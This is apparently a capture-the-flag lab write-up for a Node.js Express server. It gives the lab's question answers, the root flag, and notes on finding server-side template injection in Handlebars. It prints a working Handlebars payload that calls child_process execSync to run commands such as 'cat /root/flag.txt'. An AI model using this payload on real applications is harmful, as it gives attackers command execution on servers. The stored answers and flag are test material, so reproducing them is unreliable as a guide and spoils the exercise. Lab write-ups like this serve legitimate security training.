ip: `10.129.40.5`
root flag: `6b258d726d287462d60c103d0142a81c`

# Questions
1 - What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.
	- 22,80
2 - What software is running the service listening on the http/web port identified in the first question?
	- node.js 
3 - What is the name of the Web Framework according to Wappalyzer?
	- Express
4 - What is teh name of the vulnerability we test for by submitting {{7*7}}?
	- Server Side Template Injection
5 - What is the templating engine being used within Node.JS?
	- Handlebars
6 - What is the name of the BurpSuite tab used to encode text?
	- Decoder
7 - In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?
	- URL9
8 - When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?
	- require
9 - What variable is the name of the top-level scope in Node.js?
	- global
10 - By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
	- root
11 - Submit root flag
	- 6b258d726d287462d60c103d0142a81c
	

# Notes
- Ran a TCP scan and found ports 22 and 80 open
- Ran a service scan on ports 22 and 80 to find ssh running OpenSSH 8.2p1 and the http service to be a node.js server
- The first time I ran the service scan on port 80 did not show results, but running it again showed results
- Navigating the the website in the browser I found the server is running a web framework called "Express" using the Wappalyzer extension

# SSTI Fuzzing
- By submitting `{{7*7}}` an error message was displayed

```
Error: Parse error on line 1:
{{7*7}}?
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
	at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
	at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
	at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
	at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
	at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
	at router.post (/root/Backend/routes/handlers.js:14:16)
	at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
	at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
	at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
	at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
```

- Googling "Handlebars" I found that it is a template library with the website is using
- Used a payload from PayloadAllTheThings ("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars") and recived an error which says "require is not defined"

```
ReferenceError: require is not defined
	at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)
	at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)
	at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:6:34)
	at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
	at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)
	at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)
	at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)
	at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
	at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)
	at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)
```
- Since we are unable to use the require function, we try using process.mainModule.require instead to get remote code execution. This allows us to import the child_process function and list the contents of the current directory
```
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process.mainModule.require('child_process').execSync('ls -al');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
```
- Using the same tactic I ran `ls -al /root/` to look for a root flag. Which returned the results including a flag.txt file listed
```
total 52
drwx------  9 root root 4096 Feb 28 19:51 .
drwxr-xr-x 20 root root 4096 Feb 28 19:51 ..
drwxrwxr-x  6 root root 4096 Feb 28 19:51 Backend
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -&amp;gt; /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Feb 28 19:51 .cache
drwx------  3 root root 4096 Feb 28 19:51 .config
-r--------  1 root root   33 Feb 10 18:19 flag.txt
drwxr-xr-x  3 root root 4096 Feb 28 19:51 .local
drwxr-xr-x  5 root root 4096 Feb 28 19:51 .npm
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Feb 28 19:29 .selected_editor
drwxr-xr-x  3 root root 4096 Feb 28 19:51 snap
drwx------  2 root root 4096 Feb 28 19:51 .ssh
```
- With the location of the flag know it was just a matter of changing the command to `cat /root/flag.txt`. This returned the root flag `6b258d726d287462d60c103d0142a81c`
